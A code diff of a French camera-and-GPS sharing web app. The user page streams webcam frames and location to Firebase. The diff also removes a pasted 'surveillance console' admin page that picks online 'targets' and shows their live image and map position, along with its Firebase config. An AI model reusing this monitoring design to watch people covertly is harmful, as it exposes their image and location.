@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Stream - Utilisateur</title>
-    <!-- Utilisation de Tailwind CSS pour un design premium -->
+    <title>Partage Photo Live - Utilisateur</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
@@ -20,16 +19,16 @@
         }
     </style>
 </head>
-<body class="bg-gradient-to-tr from-indigo-900 via-purple-950 to-slate-900 min-h-screen flex items-center justify-center p-4">
+<body class="bg-gradient-to-tr from-slate-950 via-slate-900 to-indigo-950 min-h-screen flex items-center justify-center p-4">
 
-    <div class="bg-slate-900/80 border border-slate-800 text-white rounded-3xl p-6 max-w-md w-full shadow-2xl backdrop-blur-md">
+    <div class="bg-slate-900/90 border border-slate-800 text-white rounded-3xl p-6 max-w-md w-full shadow-2xl backdrop-blur-md">
         <div class="text-center mb-6">
             <span class="inline-block p-3 bg-indigo-500/10 rounded-2xl text-indigo-400 text-3xl mb-3">📸</span>
             <h1 class="text-2xl font-bold bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent">Partage Photo Live</h1>
-            <p class="text-slate-400 text-sm mt-1">Autorisez l'accès pour diffuser votre flux vers l'admin</p>
+            <p class="text-slate-400 text-sm mt-1">Diffusez votre caméra et votre position GPS en temps réel</p>
         </div>
 
-        <!-- Section Vidéo -->
+        <!-- Zone caméra -->
         <div class="relative rounded-2xl overflow-hidden bg-black aspect-video mb-4 border border-slate-800">
             <video id="localVideo" autoplay muted playsinline class="w-full h-full object-cover scale-x-[-1]"></video>
             <div id="noStreamPlaceholder" class="absolute inset-0 flex flex-col items-center justify-center bg-slate-950 text-slate-500 z-10 transition-opacity duration-300">
@@ -43,7 +42,7 @@
             </div>
         </div>
 
-        <!-- Tableau de Diagnostic en Direct (Super Pratique !) -->
+        <!-- Données de diagnostic en direct -->
         <div class="grid grid-cols-2 gap-2 mb-6 text-xs">
             <div class="bg-slate-950/50 p-3 rounded-xl border border-slate-800/50">
                 <span class="text-slate-500 block mb-0.5">Résolution caméra</span>
@@ -59,9 +58,9 @@
             </div>
         </div>
 
-        <!-- Boutons d'Action -->
+        <!-- Actions -->
         <div class="space-y-3">
-            <button id="startBtn" class="w-full py-4 px-6 bg-gradient-to-r from-indigo-500 to-purple-600 hover:from-indigo-600 hover:to-purple-700 text-white font-bold rounded-2xl shadow-lg transition-all transform active:scale-98">
+            <button id="startBtn" class="w-full py-4 px-6 bg-gradient-to-r from-indigo-500 to-purple-600 hover:from-indigo-600 hover:to-purple-700 text-white font-bold rounded-2xl shadow-lg transition-all transform active:scale-95">
                 🚀 Démarrer la diffusion
             </button>
             <button id="stopBtn" disabled class="w-full py-3 px-6 bg-slate-800 hover:bg-red-900 hover:text-white text-slate-400 font-semibold rounded-2xl transition-all disabled:opacity-30 disabled:pointer-events-none">
@@ -69,7 +68,6 @@
             </button>
         </div>
 
-        <!-- Message de statut -->
         <div id="statusMessage" class="mt-4 p-3 bg-slate-950 border border-slate-800 rounded-xl text-center text-xs text-slate-400">
             ℹ️ Prêt. Cliquez sur "Démarrer la diffusion" pour commencer.
         </div>
@@ -94,7 +92,7 @@
         const database = getDatabase(app);
 
         let localStream = null;
-        let userId = Math.random().toString(36).substring(7); // Génère un ID unique comme "dg8fwf"
+        let userId = Math.random().toString(36).substring(7); // ID unique de l'utilisateur
         let captureInterval = null;
         let imagesSentCounter = 0;
         
@@ -105,7 +103,6 @@
         const placeholder = document.getElementById('noStreamPlaceholder');
         const liveBadge = document.getElementById('liveBadge');
 
-        // Diagnostics
         const diagResolution = document.getElementById('diagResolution');
         const diagSentCount = document.getElementById('diagSentCount');
         const diagGps = document.getElementById('diagGps');
@@ -123,6 +120,7 @@
             try {
                 setStatus("📷 Demande d'accès caméra...");
                 
+                // Forcer l'acquisition d'un flux vidéo
                 localStream = await navigator.mediaDevices.getUserMedia({
                     video: { width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
@@ -132,27 +130,24 @@
                 placeholder.style.opacity = '0';
                 setTimeout(() => placeholder.style.display = 'none', 300);
                 
-                // Forcer la lecture matérielle
                 try {
                     await localVideo.play();
                 } catch (playErr) {
-                    console.warn("Autoplay bloqué par le navigateur, attente d'interaction.", playErr);
+                    console.warn("Autoplay restreint, attente d'interaction.", playErr);
                 }
 
                 setStatus("✅ Caméra connectée - Initialisation du flux...", false);
                 
-                // Canvas invisible de capture
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
                 
-                // Écouter le changement de dimension réel de la vidéo
                 localVideo.onloadedmetadata = () => {
                     diagResolution.innerText = `${localVideo.videoWidth} x ${localVideo.videoHeight}`;
                 };
 
+                // Capture et Envoi d'une frame à Firebase
                 function captureAndSend() {
                     try {
-                        // S'assurer que les dimensions vidéo sont prêtes
                         if (!localVideo.videoWidth || !localVideo.videoHeight) {
                             diagResolution.innerText = "Attente flux...";
                             return; 
@@ -164,10 +159,10 @@
                         canvas.height = localVideo.videoHeight;
                         context.drawImage(localVideo, 0, 0, canvas.width, canvas.height);
                         
-                        // Compression à 0.4 (optimise la fluidité dans Firebase en réduisant le poids)
+                        // Compression JPEG 0.4 optimale pour la bande passante
                         const imageData = canvas.toDataURL('image/jpeg', 0.4);
                         
-                        // Envoi de l'image
+                        // Enregistrement de l'image sur Firebase
                         const frameRef = ref(database, `live/${userId}/frame`);
                         set(frameRef, {
                             image: imageData,
@@ -176,18 +171,17 @@
                             imagesSentCounter++;
                             diagSentCount.innerText = imagesSentCounter;
                         }).catch(dbErr => {
-                            console.error("Erreur d'écriture Firebase:", dbErr);
+                            console.error("Erreur Firebase:", dbErr);
                         });
                         
                     } catch (captureErr) {
-                        console.error("Erreur de capture de frame:", captureErr);
+                        console.error("Erreur capture frame:", captureErr);
                     }
                 }
                 
-                // Lancement de l'intervalle d'envoi (toutes les 200 ms soit 5 FPS)
+                // Fréquence d'envoi : toutes les 200 ms (5 FPS)
                 captureInterval = setInterval(captureAndSend, 200);
                 
-                // Géolocalisation GPS en direct
                 if (navigator.geolocation) {
                     diagGps.innerText = "🛰️ Recherche GPS...";
                     navigator.geolocation.getCurrentPosition(
@@ -202,7 +196,6 @@
                         },
                         (err) => {
                             diagGps.innerText = "❌ GPS refusé ou indisponible";
-                            console.log("GPS indisponible :", err);
                         },
                         { enableHighAccuracy: true, timeout: 5000 }
                     );
@@ -210,13 +203,9 @@
                     diagGps.innerText = "❌ Non supporté par le navigateur";
                 }
                 
-                // Enregistrer le statut utilisateur actif
+                // Marquer l'utilisateur comme actif (structure simple pour l'administration)
                 const activeRef = ref(database, `users/${userId}/active`);
-                await set(activeRef, {
-                    active: true,
-                    userId: userId,
-                    timestamp: Date.now()
-                });
+                await set(activeRef, true);
                 
                 startBtn.disabled = true;
                 stopBtn.disabled = false;
@@ -249,9 +238,8 @@
             
             diagResolution.innerText = "0 x 0";
             
-            // Indiquer à l'admin que l'utilisateur est hors ligne
             const activeRef = ref(database, `users/${userId}/active`);
-            await set(activeRef, { active: false, timestamp: Date.now() });
+            await set(activeRef, false);
             
             setStatus("⏹️ Partage arrêté. Prêt pour une nouvelle connexion.");
             startBtn.disabled = false;
@@ -261,377 +249,12 @@
         startBtn.addEventListener('click', startSharing);
         stopBtn.addEventListener('click', stopSharing);
 
-        // Déconnexion propre en fermant la page
         window.addEventListener('beforeunload', () => {
             if (userId) {
                 const activeRef = ref(database, `users/${userId}/active`);
-                set(activeRef, { active: false });
+                set(activeRef, false);
             }
         });
     </script>
 </body>
 </html>
-```
-eof
-
----
-
-### 2. Page Admin (`admin.html`)
-Cette page admin est optimisée pour écouter de manière robuste le flux de photos Base64, mesurer la **latence réelle** de transmission de l'image (en ms) et assurer une compatibilité parfaite avec l'objet d'activité de Firebase.
-
-```html:Surveillance Live (Admin):admin.html
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin - Surveillance Live</title>
-    <!-- Utilisation de Tailwind CSS pour un design sombre de salle de contrôle -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Inter', sans-serif;
-        }
-        @keyframes pulse-red {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.4; }
-        }
-        .live-pulse {
-            animation: pulse-red 1s infinite;
-        }
-    </style>
-</head>
-<body class="bg-slate-950 text-slate-100 min-h-screen p-4 md:p-8">
-
-    <div class="max-w-6xl mx-auto space-y-6">
-        
-        <!-- En-tête -->
-        <div class="flex flex-col md:flex-row md:items-center justify-between p-6 bg-slate-900 border border-slate-800 rounded-3xl shadow-xl gap-4">
-            <div>
-                <h1 class="text-2xl md:text-3xl font-bold bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent flex items-center gap-2">
-                    <span>🎥</span> Console de Surveillance Live
-                </h1>
-                <p class="text-slate-400 text-sm mt-1">Réception de flux photo Base64 et positions GPS en temps réel</p>
-            </div>
-            <div id="connectionStatus" class="px-4 py-2 bg-slate-950 border border-slate-800 rounded-2xl text-xs font-semibold text-slate-400 text-center flex items-center gap-2">
-                <span class="w-2.5 h-2.5 rounded-full bg-slate-600" id="statusDot"></span>
-                <span id="statusText">Système en attente</span>
-            </div>
-        </div>
-
-        <!-- Corps de l'application -->
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-            
-            <!-- Colonne Contrôle (1/3) -->
-            <div class="space-y-6 lg:col-span-1">
-                <!-- Sélecteur d'utilisateurs -->
-                <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl">
-                    <h2 class="text-sm font-semibold text-slate-400 mb-4 uppercase tracking-wider">👤 Utilisateurs actifs</h2>
-                    <div class="space-y-4">
-                        <div>
-                            <label class="block text-xs text-slate-500 mb-2">Choisir une cible en ligne :</label>
-                            <select id="userSelect" class="w-full bg-slate-950 text-slate-300 border border-slate-800 rounded-xl p-3 text-sm focus:outline-none focus:border-indigo-500 transition-all">
-                                <option value="">-- Attente d'utilisateurs --</option>
-                            </select>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Informations GPS -->
-                <div id="userInfo" class="hidden bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl space-y-4">
-                    <h3 class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📍 Coordonnées GPS</h3>
-                    <div id="gpsData" class="space-y-3 text-sm">
-                        <!-- Rempli dynamiquement -->
-                    </div>
-                </div>
-
-                <!-- Terminal de debug intégré -->
-                <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl flex flex-col h-64">
-                    <h3 class="text-sm font-semibold text-slate-400 mb-3 uppercase tracking-wider">💾 Logs de Connexion</h3>
-                    <div id="connectionLog" class="flex-1 bg-slate-950 border border-slate-800 rounded-xl p-3 text-[10px] font-mono text-cyan-400 overflow-y-auto space-y-1">
-                        <!-- Rempli en JS -->
-                    </div>
-                </div>
-            </div>
-
-            <!-- Colonne Réception Vidéo (2/3) -->
-            <div class="lg:col-span-2 space-y-4">
-                <div class="bg-slate-900 border border-slate-800 rounded-3xl p-4 shadow-xl flex flex-col">
-                    <div class="flex items-center justify-between mb-3 px-2">
-                        <span class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📺 Retour d'image</span>
-                        <!-- Métadonnées de l'image -->
-                        <div class="flex items-center gap-3 text-xs text-slate-500">
-                            <span id="metaRes">-- px</span>
-                            <span class="text-slate-700">|</span>
-                            <span id="metaLatency">-- ms (latence)</span>
-                        </div>
-                    </div>
-
-                    <!-- Zone d'affichage image -->
-                    <div class="relative bg-slate-950 aspect-video rounded-2xl overflow-hidden border border-slate-850 flex items-center justify-center min-h-[350px]">
-                        <div id="placeholderText" class="absolute flex flex-col items-center justify-center text-slate-600 p-6 text-center">
-                            <span class="text-5xl mb-3">📡</span>
-                            <p class="text-sm font-medium">Sélectionnez un utilisateur actif à gauche puis cliquez sur "Se connecter au flux"</p>
-                        </div>
-                        <img id="remoteImage" alt="Flux Live" class="hidden w-full h-full object-contain">
-                    </div>
-
-                    <!-- Contrôles du flux -->
-                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-4">
-                        <button id="connectBtn" class="py-3 px-4 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
-                            🔗 Se connecter
-                        </button>
-                        <button id="disconnectBtn" disabled class="py-3 px-4 bg-slate-800 hover:bg-red-900 hover:text-white text-slate-400 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
-                            ⏹️ Arrêter
-                        </button>
-                        <button id="fullscreenBtn" disabled class="py-3 px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
-                            🖥️ Plein écran
-                        </button>
-                        <button id="debugBtn" class="py-3 px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl transition-all col-span-1">
-                            🐛 Infos Flux
-                        </button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
-        import { getDatabase, ref, onValue, off } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
-            authDomain: "universite-taak.firebaseapp.com",
-            databaseURL: "https://universite-taak-default-rtdb.firebaseio.com",
-            projectId: "universite-taak",
-            storageBucket: "universite-taak.firebasestorage.app",
-            messagingSenderId: "550634728649",
-            appId: "1:550634728649:web:12147e8dec3a04618c3118",
-            measurementId: "G-RD7KY6BFP4"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
-
-        let currentUserId = null;
-        let frameListenerRef = null;
-        let locationListenerRef = null;
-        let frameCount = 0;
-
-        const remoteImage = document.getElementById('remoteImage');
-        const placeholderText = document.getElementById('placeholderText');
-        const connectBtn = document.getElementById('connectBtn');
-        const disconnectBtn = document.getElementById('disconnectBtn');
-        const fullscreenBtn = document.getElementById('fullscreenBtn');
-        const debugBtn = document.getElementById('debugBtn');
-        const userSelect = document.getElementById('userSelect');
-        const userInfoDiv = document.getElementById('userInfo');
-        const gpsDataDiv = document.getElementById('gpsData');
-        const connectionLog = document.getElementById('connectionLog');
-
-        // Éléments d'état globaux
-        const statusDot = document.getElementById('statusDot');
-        const statusText = document.getElementById('statusText');
-        const metaRes = document.getElementById('metaRes');
-        const metaLatency = document.getElementById('metaLatency');
-
-        function addLog(message) {
-            const time = new Date().toLocaleTimeString();
-            connectionLog.innerHTML = `<p>[${time}] ${message}</p>` + connectionLog.innerHTML;
-        }
-
-        function setSystemStatus(message, state = 'idle') {
-            statusText.innerText = message;
-            statusDot.className = "w-2.5 h-2.5 rounded-full";
-            
-            if (state === 'live') {
-                statusDot.classList.add('bg-red-500', 'live-pulse');
-            } else if (state === 'pending') {
-                statusDot.classList.add('bg-amber-500');
-            } else {
-                statusDot.classList.add('bg-slate-600');
-            }
-        }
-
-        // Charger et filtrer les utilisateurs actifs de manière robuste
-        function loadUsers() {
-            const usersRef = ref(database, 'users');
-            onValue(usersRef, (snapshot) => {
-                const users = snapshot.val();
-                const previousSelection = userSelect.value;
-                
-                userSelect.innerHTML = '<option value="">-- Choisir un utilisateur --</option>';
-                
-                let foundActive = false;
-                if (users) {
-                    Object.keys(users).forEach(userId => {
-                        const userObj = users[userId];
-                        // Vérification robuste : supporte un booléen classique OU un objet { active: true }
-                        const isUserActive = userObj.active === true || (userObj.active && userObj.active.active === true);
-                        
-                        if (isUserActive) {
-                            foundActive = true;
-                            const isSelected = (userId === previousSelection) ? 'selected' : '';
-                            userSelect.innerHTML += `<option value="${userId}" ${isSelected}>👤 Utilisateur #${userId.slice(-6).toUpperCase()} (En ligne)</option>`;
-                        }
-                    });
-                }
-                
-                if (!foundActive) {
-                    userSelect.innerHTML = '<option value="">-- Aucun utilisateur actif --</option>';
-                }
-            });
-        }
-
-        // Écouter les infos GPS
-        function loadUserInfo(userId) {
-            if (locationListenerRef) {
-                off(locationListenerRef);
-            }
-            locationListenerRef = ref(database, `users/${userId}/location`);
-            onValue(locationListenerRef, (snapshot) => {
-                const location = snapshot.val();
-                if (location) {
-                    userInfoDiv.style.display = 'block';
-                    gpsDataDiv.innerHTML = `
-                        <div class="space-y-1">
-                            <span class="text-xs text-slate-500 block">Latitude</span>
-                            <span class="font-mono text-slate-200 font-bold">${location.lat}</span>
-                        </div>
-                        <div class="space-y-1">
-                            <span class="text-xs text-slate-500 block">Longitude</span>
-                            <span class="font-mono text-slate-200 font-bold">${location.lng}</span>
-                        </div>
-                        <div class="pt-2">
-                            <a href="https://www.google.com/maps?q=${location.lat},${location.lng}" 
-                               target="_blank" class="w-full inline-block text-center py-2 px-4 bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-400 font-semibold rounded-xl text-xs transition-all">
-                                🗺️ Ouvrir dans Google Maps
-                            </a>
-                        </div>
-                        <div class="text-[10px] text-slate-500 text-right pt-1">
-                            Mis à jour : ${new Date(location.timestamp).toLocaleTimeString()}
-                        </div>
-                    `;
-                } else {
-                    userInfoDiv.style.display = 'none';
-                }
-            });
-        }
-
-        // Connexion au flux d'images Base64
-        function connectToUser() {
-            currentUserId = userSelect.value;
-            if (!currentUserId) {
-                setSystemStatus("⚠️ Choisissez une cible", "pending");
-                addLog("⚠️ Erreur : aucun utilisateur sélectionné.");
-                return;
-            }
-
-            // Réinitialisation préalable
-            disconnect();
-            currentUserId = userSelect.value;
-            
-            setSystemStatus("🔄 Connexion...", "pending");
-            connectBtn.disabled = true;
-            disconnectBtn.disabled = false;
-            fullscreenBtn.disabled = false;
-            
-            addLog(`🔍 Demande du flux pour l'utilisateur #${currentUserId.slice(-6).toUpperCase()}...`);
-            
-            frameListenerRef = ref(database, `live/${currentUserId}/frame`);
-            frameCount = 0;
-
-            onValue(frameListenerRef, (snapshot) => {
-                const data = snapshot.val();
-                if (data && data.image) {
-                    placeholderText.style.display = 'none';
-                    remoteImage.src = data.image;
-                    remoteImage.style.display = 'block';
-                    frameCount++;
-
-                    // Calcul de la latence (temps d'envoi vs temps de réception)
-                    const latency = Date.now() - data.timestamp;
-                    metaLatency.innerText = `${latency} ms`;
-                    metaRes.innerText = `${remoteImage.naturalWidth || '--'} x ${remoteImage.naturalHeight || '--'} px`;
-
-                    if (frameCount === 1) {
-                        setSystemStatus("🔴 EN DIRECT", "live");
-                        addLog("✅ Flux d'images reçu et stabilisé !");
-                    }
-                } else {
-                    addLog("⚠️ En attente du démarrage de la caméra côté utilisateur...");
-                }
-            }, (error) => {
-                addLog(`❌ Erreur Firebase: ${error.message}`);
-            });
-
-            loadUserInfo(currentUserId);
-        }
-
-        function disconnect() {
-            if (frameListenerRef) {
-                off(frameListenerRef);
-                frameListenerRef = null;
-            }
-            if (locationListenerRef) {
-                off(locationListenerRef);
-                locationListenerRef = null;
-            }
-            
-            remoteImage.src = "";
-            remoteImage.style.display = 'none';
-            placeholderText.style.display = 'flex';
-            userInfoDiv.style.display = 'none';
-            
-            connectBtn.disabled = false;
-            disconnectBtn.disabled = true;
-            fullscreenBtn.disabled = true;
-            
-            metaRes.innerText = "-- px";
-            metaLatency.innerText = "-- ms";
-            frameCount = 0;
-            
-            setSystemStatus("🔌 Déconnecté", "idle");
-            addLog("🔌 Déconnecté");
-        }
-
-        function toggleFullscreen() {
-            if (!document.fullscreenElement) {
-                remoteImage.requestFullscreen().catch(err => {
-                    console.error("Erreur plein écran:", err);
-                });
-            } else {
-                document.exitFullscreen();
-            }
-        }
-
-        connectBtn.addEventListener('click', connectToUser);
-        disconnectBtn.addEventListener('click', disconnect);
-        fullscreenBtn.addEventListener('click', toggleFullscreen);
-        userSelect.addEventListener('change', disconnect);
-        
-        debugBtn.addEventListener('click', () => {
-            if (remoteImage.src) {
-                addLog(`ℹ️ [DEBUG] Image active: ${remoteImage.naturalWidth}x${remoteImage.naturalHeight}px. Nb images reçues: ${frameCount}`);
-            } else {
-                addLog(`⚠️ [DEBUG] Aucun flux actif.`);
-            }
-        });
-
-        // Lancement initial
-        loadUsers();
-    </script>
-</body>
-</html>
-```
-eof
-
----
-
-### Qu'est-ce qui change avec cette mise à jour ?
-1. **Force l'autoplay** : La page `user.html` utilise maintenant des routines de démarrage forcé (`localVideo.play()`) pour garantir que les dimensions de la vidéo de la caméra s'activent immédiatement.
-2. **Tableau de diagnostic en direct** : Si l'utilisateur a démarré son flux, il verra un compteur **"Images envoyées"** défiler. Si ce compteur n'augmente pas, le problème vient des permissions de la caméra ou de la connexion de l'utilisateur. Si le compteur défile mais que l'admin ne reçoit rien, le problème vient de l'ID sélectionné ou de l'admin.
-3. **Calculateur de latence** : L'admin peut voir en millisecondes le temps réel que met l'image à transiter par Firebase (généralement entre 80ms et 300ms).
-4. **Sélection robuste** : Résolution du bug où l'état d'activité était parfois ignoré car Firebase sauvegardait un dictionnaire au lieu d'un simple booléen.
